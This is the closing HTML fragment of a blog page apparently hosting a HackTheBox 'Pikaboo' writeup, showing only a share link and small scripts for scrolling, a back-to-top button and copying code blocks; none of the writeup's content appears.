href="https://telegram.me/share/url?text=HackTheBox%20Writeup%3a%20Pikaboo&amp;url=https%3a%2f%2fxzebra.dev%2fblog%2fhackthebox_writeup_pikaboo%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"></path></svg></a></div></footer></article></main><a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"></path></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>